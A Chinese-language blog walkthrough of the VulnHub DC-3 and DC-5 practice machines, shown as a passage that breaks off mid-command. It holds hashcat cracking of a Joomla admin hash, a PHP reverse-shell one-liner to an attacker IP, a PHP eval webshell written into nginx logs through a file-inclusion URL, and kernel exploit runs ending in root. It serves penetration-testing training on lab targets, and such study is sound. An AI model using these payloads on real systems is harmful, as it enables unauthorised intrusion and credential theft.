\n\n从这里我们可以发现原来管理员将前缀设置为d8uea了。当然，最重要的是我们拿到了admin用户的密码哈希$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu\n破解哈希值$2开头的多半是bcrypt。丢到在线破解网站上尝试没有破解出来。那就本地试试吧。\n┌──(kali㉿kali)-[~/vulnhub/DC/3/workSpace]└─$ hashcat -O -a 0 -m 3200 &#x27;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#x27; /usr/share/wordlists/rockyou.txthashcat (v6.2.6) startingOpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]==================================================================================================================================================* Device #1: pthread-sandybridge-Intel(R) Core(TM) i7-6700 CPU @ 3.40GHz, 2913/5890 MB (1024 MB allocatable), 8MCUKernel /usr/share/hashcat/OpenCL/m03200-optimized.cl:Optimized kernel requested, but not available or not requiredFalling back to pure kernelMinimum password length supported by kernel: 0Maximum password length supported by kernel: 72Hashes: 1 digests; 1 unique digests, 1 unique saltsBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotatesRules: 1Optimizers applied:* Zero-Byte* Single-Hash* Single-SaltWatchdog: Temperature abort trigger set to 90cHost memory required for this attack: 0 MBDictionary cache hit:* Filename..: /usr/share/wordlists/rockyou.txt* Passwords.: 14344385* Bytes.....: 139921507* Keyspace..: 14344385$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu:snoopy                                                          Session..........: hashcatStatus...........: CrackedHash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))Hash.Target......: $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0...lfB1ZuTime.Started.....: Wed May 31 15:35:40 2023 (3 secs)Time.Estimated...: Wed May 31 15:35:43 2023 (0 secs)Kernel.Feature...: Pure KernelGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........:       85 H/s (7.63ms) @ Accel:8 Loops:16 Thr:1 Vec:1Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)Progress.........: 192/14344385 (0.00%)Rejected.........: 0/192 (0.00%)Restore.Point....: 128/14344385 (0.00%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1008-1024Candidate.Engine.: Device GeneratorCandidates.#1....: carolina -&gt; novemberHardware.Mon.#1..: Util: 87%Started: Wed May 31 15:34:50 2023Stopped: Wed May 31 15:35:45 2023\n\n解释一下hashcat里的一些参数：-O表示使用Optimized kernel（这台机子实际上不支持）， -a 0代表使用字典攻击， -m 3200代表哈希类型是bcrypt(3200)。\n发现秒破解出来登录凭证:admin:snoopy\n成功登录后台。（后台地址之前扫描就扫出来了：http://192.168.56.111/administrator/）\n\n后台get shell如果对joomla这套CMS比较熟的话可以直奔顶栏Extensions导航到templates\n\n然后我们直接选择当前使用的模版protostar\n\n向error.php页面写入我们的反弹shell。（向404页面写入的好处在于不用精确定位写入页面在哪，瞎输一个不存在的页面就行）\n\n简简单单插个一句话&lt;?php system(&quot;/bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/192.168.56.144/443 0&gt;&amp;1&#39;&quot;); ?&gt;\n成功拿shell\n┌──(kali㉿kali)-[~/vulnhub/DC/3/workSpace]└─$ sudo nc -lvp 443                      listening on [any] 443 ...192.168.56.111: inverse host lookup failed: Host name lookup failureconnect to [192.168.56.144] from (UNKNOWN) [192.168.56.111] 33186bash: cannot set terminal process group (1183): Inappropriate ioctl for devicebash: no job control in this shellwww-data@DC-3:/var/www/html$ \n\n提权手动枚举www-data@DC-3:/var/www/html$ uname -auname -aLinux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux\n\n如果比较有经验的话可以看出4.4.0-21-generic版本一般是存在可利用内核漏洞的，当然不知道可以直接searchsploit Linux kenerls 4.4查一下。但是显然提权第一选择不是内核漏洞，先看看别的吧。\nwww-data@DC-3:/var/www/html$ sudo -lsudo -lsudo: no tty present and no askpass program specifiedwww-data@DC-3:/var/www/html$ which pythonwhich python/usr/bin/pythonwww-data@DC-3:/var/www/html$ python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;www-data@DC-3:/var/www/html$ sudo -lsudo -l[sudo] password for www-data: www-dataSorry, try again.www-data@DC-3:/home/dc3$ find / -type f -perm -u=s 2&gt;/dev/nullfind / -type f -perm -u=s 2&gt;/dev/null/bin/ping6/bin/ntfs-3g/bin/umount/bin/su/bin/fusermount/bin/mount/bin/ping/usr/lib/snapd/snap-confine/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/i386-linux-gnu/lxc/lxc-user-nic/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device/usr/bin/passwd/usr/bin/newgidmap/usr/bin/gpasswd/usr/bin/sudo/usr/bin/pkexec/usr/bin/chsh/usr/bin/chfn/usr/bin/newuidmap/usr/bin/newgrp/usr/bin/atwww-data@DC-3:/home/dc3$ cat /etc/crontabcat /etc/crontab# /etc/crontab: system-wide crontab# Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;# command to install the new version when you edit this file# and files in /etc/cron.d. These files also have username fields,# that none of the other crontabs do.SHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin# m h dom mon dow user  command17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )#\n\nsudo，suid和cron三件套没有值得注意的地方，当然cron没有详细列举具体cron脚本啥的。但是感觉不是很理想，先看看别的吧。\n再看看网页的配置文件。\nwww-data@DC-3:/var/www/html$ cat configuration.phpcat configuration.php&lt;?phpclass JConfig &#123;        public $offline = &#x27;0&#x27;;        public $offline_message = &#x27;This site is down for maintenance.&lt;br /&gt;Please check back again soon.&#x27;;        public $display_offline_message = &#x27;1&#x27;;        public $offline_image = &#x27;&#x27;;        public $sitename = &#x27;DC-3&#x27;;        public $editor = &#x27;tinymce&#x27;;        public $captcha = &#x27;0&#x27;;        public $list_limit = &#x27;20&#x27;;        public $access = &#x27;1&#x27;;        public $debug = &#x27;0&#x27;;        public $debug_lang = &#x27;0&#x27;;        public $dbtype = &#x27;mysqli&#x27;;        public $host = &#x27;localhost&#x27;;        public $user = &#x27;root&#x27;;        public $password = &#x27;squires&#x27;;        public $db = &#x27;joomladb&#x27;;        public $dbprefix = &#x27;d8uea_&#x27;;        public $live_site = &#x27;&#x27;;        public $secret = &#x27;7M6S1HqGMvt1JYkY&#x27;;        public $gzip = &#x27;0&#x27;;        public $error_reporting = &#x27;default&#x27;;        public $helpurl = &#x27;https://help.joomla.org/proxy/index.php?keyref=Help&#123;major&#125;&#123;minor&#125;:&#123;keyref&#125;&#x27;;        public $ftp_host = &#x27;127.0.0.1&#x27;;        public $ftp_port = &#x27;21&#x27;;        public $ftp_user = &#x27;&#x27;;        public $ftp_pass = &#x27;&#x27;;        public $ftp_root = &#x27;&#x27;;        public $ftp_enable = &#x27;0&#x27;;        public $offset = &#x27;UTC&#x27;;        public $mailonline = &#x27;1&#x27;;        public $mailer = &#x27;mail&#x27;;        public $mailfrom = &#x27;freddy@norealaddress.net&#x27;;        public $fromname = &#x27;DC-3&#x27;;        public $sendmail = &#x27;/usr/sbin/sendmail&#x27;;        public $smtpauth = &#x27;0&#x27;;        public $smtpuser = &#x27;&#x27;;        public $smtppass = &#x27;&#x27;;        public $smtphost = &#x27;localhost&#x27;;        public $smtpsecure = &#x27;none&#x27;;        public $smtpport = &#x27;25&#x27;;        public $caching = &#x27;0&#x27;;        public $cache_handler = &#x27;file&#x27;;        public $cachetime = &#x27;15&#x27;;        public $cache_platformprefix = &#x27;0&#x27;;        public $MetaDesc = &#x27;A website for DC-3&#x27;;        public $MetaKeys = &#x27;&#x27;;        public $MetaTitle = &#x27;1&#x27;;        public $MetaAuthor = &#x27;1&#x27;;        public $MetaVersion = &#x27;0&#x27;;        public $robots = &#x27;&#x27;;        public $sef = &#x27;1&#x27;;        public $sef_rewrite = &#x27;0&#x27;;        public $sef_suffix = &#x27;0&#x27;;        public $unicodeslugs = &#x27;0&#x27;;        public $feed_limit = &#x27;10&#x27;;        public $feed_email = &#x27;none&#x27;;        public $log_path = &#x27;/var/www/html/administrator/logs&#x27;;        public $tmp_path = &#x27;/var/www/html/tmp&#x27;;        public $lifetime = &#x27;15&#x27;;        public $session_handler = &#x27;database&#x27;;        public $shared_session = &#x27;0&#x27;;&#125;\n\n发现数据库root用户的密码squires。先试试有没有大聪明密码复用（su），可惜都没有。再看看数据库是不是以root权限运行（ps aux | grep mysql），发现也不是。\n登陆数据库看看有无信息。\nwww-data@DC-3:/home/dc3$ mysql -uroot -pmysql -uroot -pEnter password: squiresWelcome to the MySQL monitor.  Commands end with ; or \\g.Your MySQL connection id is 3631Server version: 5.7.25-0ubuntu0.16.04.2 (Ubuntu)Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &#x27;help;&#x27; or &#x27;\\h&#x27; for help. Type &#x27;\\c&#x27; to clear the current input statement.mysql&gt; show databases;show databases;+--------------------+| Database           |+--------------------+| information_schema || joomladb           || mysql              || performance_schema || sys                |+--------------------+5 rows in set (0.00 sec)mysql&gt; use mysql;use mysql;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;show tables;+---------------------------+| Tables_in_mysql           |+---------------------------+| columns_priv              || db                        || engine_cost               || event                     || func                      || general_log               || gtid_executed             || help_category             || help_keyword              || help_relation             || help_topic                || innodb_index_stats        || innodb_table_stats        || ndb_binlog_index          || plugin                    || proc                      || procs_priv                || proxies_priv              || server_cost               || servers                   || slave_master_info         || slave_relay_log_info      || slave_worker_info         || slow_log                  || tables_priv               || time_zone                 || time_zone_leap_second     || time_zone_name            || time_zone_transition      || time_zone_transition_type || user                      |+---------------------------+31 rows in set (0.00 sec)\n\n这里用\\g是为了将结果旋转90度显示，方便我们查看列名，不旋转易读性很差。\nmysql&gt; select * from user\\g;select * from user\\g;+-----------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+-----------------------+-------------------+----------------+| Host      | User             | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin                | authentication_string                     | password_expired | password_last_changed | password_lifetime | account_locked |+-----------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+-----------------------+-------------------+----------------+| localhost | root             | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *BFD14C8A23EF160EED3D54E16D4F5311264D0963 | N                | 2019-03-23 19:31:20   |              NULL | N              || localhost | mysql.sys        | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | N                | 2019-03-25 13:47:43   |              NULL | Y              || localhost | debian-sys-maint | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *0640482736E7906211AEA47971B6C8478BA7DB4D | N                | 2019-03-23 19:16:41   |              NULL | N              || localhost | mysql.session    | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | Y          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | N                | 2019-03-25 13:47:42   |              NULL | Y              |+-----------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+-----------------------+-------------------+----------------+4 rows in set (0.00 sec)ERROR: No query specified\n\n我们对User,authentication_string这两个列比较感兴趣，查一下。\nmysql&gt; select User,authentication_string from user;select User,authentication_string from user;+------------------+-------------------------------------------+| User             | authentication_string                     |+------------------+-------------------------------------------+| root             | *BFD14C8A23EF160EED3D54E16D4F5311264D0963 || mysql.sys        | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE || debian-sys-maint | *0640482736E7906211AEA47971B6C8478BA7DB4D || mysql.session    | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |+------------------+-------------------------------------------+4 rows in set (0.00 sec)\n\n这里作者提示了THIS IS NOT AVALID PASSWORD THAT CAN BE USED HERE，说明是无关的信息。那就说明这条路也到头了。\n内核提权事已至此，手动列举没有发现什么quick win，那只能回归简单粗暴了。\n先试试脏牛：\nwww-data@DC-3:/tmp/test$ gcc -pthread 40839.c -o dirty -lcryptgcc -pthread 40839.c -o dirty -lcryptwww-data@DC-3:/tmp/test$ ./dirty./dirtyPlease enter the new password: password\n\n没反应了，看看虚拟机发现已经寄了。脏牛成功弄崩了。\n所以说这就是不要第一步就内核提权的原因，很有可能把机子干趴了。\n试了几个别的：40049.c,40839.c,40871.c,42033.txt,44300.c,45010.c都没成功。\n直到试到了ebpf_mapfd_doubleput才成功。按照其说明操作即可（编译有warning也不影响）。\nwww-data@DC-3:/tmp/test$ wget 192.168.56.144:8000/exploit.tarwget 192.168.56.144:8000/exploit.tar--2023-05-31 19:14:40--  http://192.168.56.144:8000/exploit.tarConnecting to 192.168.56.144:8000... connected.HTTP request sent, awaiting response... 200 OKLength: 20480 (20K) [application/x-tar]Saving to: &#x27;exploit.tar&#x27;     0K .......... ..........                                 100% 35.8M=0.001s2023-05-31 19:14:40 (35.8 MB/s) - &#x27;exploit.tar&#x27; saved [20480/20480]www-data@DC-3:/tmp/test$ ls -lals -latotal 64drwxr-xr-x 2 www-data www-data  4096 May 31 19:14 .drwxrwxrwt 9 root     root      4096 May 31 19:09 ..-rw-r--r-- 1 www-data www-data 13176 May 31 19:06 45010.c-rwxr-xr-x 1 www-data www-data 16764 May 31 19:09 exp-rw-r--r-- 1 www-data www-data 20480 Aug 16  2016 exploit.tarwww-data@DC-3:/tmp/test$ tar xvf exploitar xvf exploit.tar ebpf_mapfd_doubleput_exploit/ebpf_mapfd_doubleput_exploit/hello.cebpf_mapfd_doubleput_exploit/suidhelper.cebpf_mapfd_doubleput_exploit/compile.shebpf_mapfd_doubleput_exploit/doubleput.cwww-data@DC-3:/tmp/test$ lsls45010.cebpf_mapfd_doubleput_exploitexpexploit.tarwww-data@DC-3:/tmp/test$ cd ebpfcd ebpf_mapfd_doubleput_exploit/www-data@DC-3:/tmp/test/ebpf_mapfd_doubleput_exploit$ ls -lals -latotal 28drwxr-x--- 2 www-data www-data 4096 Apr 26  2016 .drwxr-xr-x 3 www-data www-data 4096 May 31 19:14 ..-rwxr-x--- 1 www-data www-data  155 Apr 26  2016 compile.sh-rw-r----- 1 www-data www-data 4188 Apr 26  2016 doubleput.c-rw-r----- 1 www-data www-data 2186 Apr 26  2016 hello.c-rw-r----- 1 www-data www-data  255 Apr 26  2016 suidhelper.cwww-data@DC-3:/tmp/test/ebpf_mapfd_doubleput_exploit$ ./comp    ./compile.sh doubleput.c: In function &#x27;make_setuid&#x27;:doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]    .insns = (__aligned_u64) insns,             ^doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]    .license = (__aligned_u64)&quot;&quot;               ^www-data@DC-3:/tmp/test/ebpf_mapfd_doubleput_exploit$ ls -lals -latotal 60drwxr-x--- 2 www-data www-data  4096 May 31 19:15 .drwxr-xr-x 3 www-data www-data  4096 May 31 19:14 ..-rwxr-x--- 1 www-data www-data   155 Apr 26  2016 compile.sh-rwxr-xr-x 1 www-data www-data 12336 May 31 19:15 doubleput-rw-r----- 1 www-data www-data  4188 Apr 26  2016 doubleput.c-rwxr-xr-x 1 www-data www-data  8028 May 31 19:15 hello-rw-r----- 1 www-data www-data  2186 Apr 26  2016 hello.c-rwxr-xr-x 1 www-data www-data  7524 May 31 19:15 suidhelper-rw-r----- 1 www-data www-data   255 Apr 26  2016 suidhelper.cwww-data@DC-3:/tmp/test/ebpf_mapfd_doubleput_exploit$ ./doubleput./doubleputstarting writevwoohoo, got pointer reusewritev returned successfully. if this worked, you&#x27;ll have a root shell in &lt;=60 seconds.suid file detected, launching rootshell...we have root privs now...iduid=0(root) gid=0(root) groups=0(root),33(www-data)whoamirootcd /rootls -latotal 28drwx------  2 root root 4096 Apr 25  2020 .drwxr-xr-x 22 root root 4096 Mar 23  2019 ..-rw-------  1 root root 1202 Apr 25  2020 .bash_history-rw-r--r--  1 root root 3106 Oct 23  2015 .bashrc-rw-------  1 root root   71 Mar 23  2019 .mysql_history-rw-r--r--  1 root root  148 Aug 18  2015 .profile-rw-------  1 root root    0 Apr 25  2020 .viminfo-rw-r--r--  1 root root  604 Mar 26  2019 the-flag.txtcat the-flag.txt __        __   _ _   ____                   _ _ _ _  \\ \\      / /__| | | |  _ \\  ___  _ __   ___| | | | |  \\ \\ /\\ / / _ \\ | | | | | |/ _ \\| &#x27;_ \\ / _ \\ | | | |   \\ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|    \\_/\\_/ \\___|_|_| |____/ \\___/|_| |_|\\___(_|_|_|_)                                                     Congratulations are in order.  :-)I hope you&#x27;ve enjoyed this challenge as I enjoyed making it.If there are any ways that I can improve these little challenges,please let me know.As per usual, comments and complaints can be sent via Twitter to @DCAU7Have a great day!!!!\n\n成功提权。\n","categories":["vulnhub"],"tags":["walkthrough","DC"]},{"title":"[vulnhub]  DC:5","url":"/2023/06/02/DC-5/","content":"\n\n\n简介DC-5，开始上难度了，主要考对文件包含的理解，考在发现文件包含漏洞的存在后，该查看哪些信息，如何利用文件包含get shell。提权部分和解了。\n信息收集Port Scan:\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 20:37 CSTWarning: 192.168.56.114 giving up on port because retransmission cap hit (10).Nmap scan report for 192.168.56.114Host is up (0.00050s latency).Not shown: 37405 filtered tcp ports (no-response), 28127 closed tcp ports (reset)PORT      STATE SERVICE80/tcp    open  http111/tcp   open  rpcbind49405/tcp open  unknownMAC Address: 08:00:27:70:CC:B2 (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 116.67 seconds\n\n\nTCP, Service, OS Scan:\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 20:39 CSTNmap scan report for 192.168.56.114Host is up (0.00093s latency).PORT      STATE SERVICE VERSION80/tcp    open  http    nginx 1.6.2111/tcp   open  rpcbind 2-4 (RPC #100000)49405/tcp open  status  1 (RPC #100024)MAC Address: 08:00:27:70:CC:B2 (Oracle VirtualBox virtual NIC)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 14.06 seconds\n\n\nUDP Scan:\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 20:39 CSTWarning: 192.168.56.114 giving up on port because retransmission cap hit (10).Nmap scan report for 192.168.56.114Host is up (0.0016s latency).Not shown: 65458 open|filtered udp ports (no-response), 75 closed udp ports (port-unreach)PORT      STATE SERVICE111/udp   open  rpcbind40520/udp open  unknownMAC Address: 08:00:27:70:CC:B2 (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 72.85 seconds\n\n\nSimple Vuln Scan:\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 20:40 CSTNmap scan report for 192.168.56.114Host is up (0.00022s latency).Not shown: 998 closed tcp ports (reset)PORT    STATE SERVICE80/tcp  open  http|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.| http-csrf: | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.114|   Found the following possible CSRF vulnerabilities: |     |     Path: http://192.168.56.114:80/contact.php|     Form id: fname|_    Form action: thankyou.php111/tcp open  rpcbindMAC Address: 08:00:27:70:CC:B2 (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 74.57 seconds\n\n\nnikto Vuln Scan:\n- Nikto v2.5.0---------------------------------------------------------------------------+ Target IP:          192.168.56.114+ Target Hostname:    192.168.56.114+ Target Port:        80+ Start Time:         2023-06-02 20:41:49 (GMT8)---------------------------------------------------------------------------+ Server: nginx/1.6.2+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.+ 8102 requests: 0 error(s) and 3 item(s) reported on remote host+ End Time:           2023-06-02 20:42:12 (GMT8) (23 seconds)---------------------------------------------------------------------------+ 1 host(s) tested\n\n\nweb fingerprint Scan:\nhttp://192.168.56.114 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.6.2], IP[192.168.56.114], Title[Welcome], nginx[1.6.2]\n\n\nSimple Web content discovery:\n-----------------DIRB v2.22    By The Dark Raver-----------------START_TIME: Fri Jun  2 20:42:19 2023URL_BASE: http://192.168.56.114/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612                                                          ---- Scanning URL: http://192.168.56.114/ ----==&gt; DIRECTORY: http://192.168.56.114/css/                                                                                                                                                  ==&gt; DIRECTORY: http://192.168.56.114/images/                                                                                                                                               + http://192.168.56.114/index.php (CODE:200|SIZE:4025)                                                         ---- Entering directory: http://192.168.56.114/css/ ----                                  ---- Entering directory: http://192.168.56.114/images/ ----                                  -----------------END_TIME: Fri Jun  2 20:42:25 2023DOWNLOADED: 13836 - FOUND: 1\n\ndirb没啥信息就用feroxbuster再扫一下。\n┌──(kali㉿kali)-[~/vulnhub/DC/5/workSpace]└─$ sudo feroxbuster -u http://192.168.56.114 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 200,301,302,401,403                     ___  ___  __   __     __      __         __   ___|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___by Ben &quot;epi&quot; Risher 🤓                 ver: 2.10.0───────────────────────────┬────────────────────── 🎯  Target Url            │ http://192.168.56.114 🚀  Threads               │ 50 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌  Status Codes          │ [200, 301, 302, 401, 403] 💥  Timeout (secs)        │ 7 🦡  User-Agent            │ feroxbuster/2.10.0 💉  Config File           │ /etc/feroxbuster/ferox-config.toml 🔎  Extract Links         │ true 🏁  HTTP methods          │ [GET] 🔃  Recursion Depth       │ 4───────────────────────────┴────────────────────── 🏁  Press [ENTER] to use the Scan Management Menu™──────────────────────────────────────────────────301      GET        7l       12w      184c http://192.168.56.114/images =&gt; http://192.168.56.114/images/200      GET      145l      343w     2638c http://192.168.56.114/css/styles.css200      GET       54l      560w     4292c http://192.168.56.114/about-us.php200      GET       52l      525w     4100c http://192.168.56.114/solutions.php200      GET       58l      752w     5645c http://192.168.56.114/faq.php200      GET       54l      525w     4025c http://192.168.56.114/index.php200      GET       72l      479w     4282c http://192.168.56.114/contact.php200      GET       54l      525w     4025c http://192.168.56.114/403      GET        7l       10w      168c http://192.168.56.114/css/301      GET        7l       12w      184c http://192.168.56.114/css =&gt; http://192.168.56.114/css/\n\n总计一下，最终扫出来的有用信息就是80端口跑着nginx服务搭的网站。\n且目录扫描也没有太多的收获。只能死怼网站了。\nweb渗透查看网页前几个页面来回看也没有什么信息。contact页面的输入框尝试加单引号&#39;测试SQL注入也没有什么结果。但是在来回测试其他可能的sql注入的可能时，发现thankyou.php底下的footer的年份在变化。\n\n\n这东西为啥会变，很奇怪。F12打开控制台发现footer部分是一个footer-warper。\n\n结合之前目录扫描发现的footer.php页面，我们打开footer.php页面刷新几次，发现其值确实是在变化。\n\n这以上信息说明了什么呢？说明了thankyou.php底下肯定include了footer.php。但是，他到底什么怎么include的，是写死的还是传参的我们不得而知。因此，我们可以尝试fuzz一下，毕竟没路了，只能试试这个了。就当他是接受参数包含进去的。\n文件包含我们要fuzz两个参数：一个是接收的参数，一个是文件位置。\n\n我们直接用burpsuite里的intruder进行fuzz。用intruder有个好处在于它里面内置了参数以及文件遍历的字典，我们直接选pitchfork模式开始用就行。字典一变量我选的是Server-side variable names,字典二位置直接选Fuzzing - path travesal (single file)就可以。\n\n我们发现其确实是用的file接受参数。\n那我们手动验证一下：\n发现非常OK。\n然而，现在还有一个重大问题就是没有文件上传的地方。那我们如何拿shell？\n上网查了下，发现nginx存在文件包含时可以尝试往错误日志以及访问日志写入一句话木马然后用蚁剑连接。然而，问题又来了，我们怎么知道这些日志在哪，虽然一般来说确实是在/var/log下,但是也可能放在其他地方。我们用字典枚举一下可能的地方吧，一样用的是burpsuite，不过这次用sniper模式即可，字典选Local files - Linux。\n\n位置发现，确实是在/var/log/nginx/error.log。那我们接下来就是构造payload写入错误日志中了。\nget shell我们直接简单粗暴构造一条:\nhttp://192.168.56.114/thankyou.php?file=&lt;?php @eval($_REQUEST[&quot;shell&quot;]); ?&gt;\n\n直接以一句话木马作为文件名，显然包含不到，因此就会写入到错误日志中。\n验证一下：\n\n发现确实写入了。\n蚁剑连一下。\n\n成功连接，直接向&#x2F;tmp写入一个反弹shell，然后文件包含请求一下就拿到反弹shell了。\n┌──(kali㉿kali)-[~]└─$ sudo nc -lvp 443                   [sudo] password for kali: listening on [any] 443 ...192.168.56.114: inverse host lookup failed: Unknown hostconnect to [192.168.56.144] from (UNKNOWN) [192.168.56.114] 53100bash: cannot set terminal process group (482): Inappropriate ioctl for devicebash: no job control in this shellwww-data@dc-5:~/html$\n\n提权上来先sudo -l,没tty，python import一下，再次sudo发现没密码。行吧。\n看看set suid 的bin。\nwww-data@dc-5:/etc$ find / -type f -perm -u=s 2&gt;/dev/nullfind / -type f -perm -u=s 